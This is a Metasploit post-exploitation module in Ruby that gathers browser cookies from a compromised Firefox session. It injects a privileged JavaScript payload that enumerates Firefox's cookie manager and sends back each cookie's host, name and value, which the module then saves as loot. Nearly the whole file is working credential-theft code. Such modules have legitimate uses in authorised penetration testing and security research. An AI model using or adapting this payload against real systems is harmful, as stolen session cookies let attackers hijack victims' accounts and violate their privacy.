##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'
require 'msf/core'
require 'msf/core/payload/firefox'

class Metasploit3 < Msf::Post

  include Msf::Payload::Firefox
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Firefox Gather Cookies from Privileged Javascript Shell',
      'Description'   => %q{
        This module allows collection of cookies from a Firefox Privileged Javascript Shell.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'joev' ],
      'DisclosureDate' => 'Mar 26 2014'
    ))

    register_options([
      OptInt.new('TIMEOUT', [true, "Maximum time (seconds) to wait for a response", 90])
    ], self.class)
  end

  def run
    print_status "Running the privileged javascript..."
    session.shell_write("[JAVASCRIPT]#{js_payload}[/JAVASCRIPT]")
    results = session.shell_read_until_token("[!JAVASCRIPT]", 0, datastore['TIMEOUT'])
    if results.present?
      begin
        cookies = JSON.parse(results)
        file = store_loot("firefox.cookies.json", "text/json", rhost, results)
        print_good("Saved #{cookies.length} cookies to #{file}")
      rescue JSON::ParserError => e
        print_warning(results)
      end
    end
  end

  def js_payload
    %Q|
      (function(send){
        try {
          var cookieManager = Components.classes["@mozilla.org/cookiemanager;1"]
                        .getService(Components.interfaces.nsICookieManager);
          var cookies = [];
          var iter = cookieManager.enumerator;
          while (iter.hasMoreElements()){
            var cookie = iter.getNext();
            if (cookie instanceof Components.interfaces.nsICookie){
              cookies.push({host:cookie.host, name:cookie.name, value:cookie.value})
            }
          }
          send(JSON.stringify(cookies));
        } catch (e) {
          send(e);
        }
      })(send);
    |.strip
  end
end
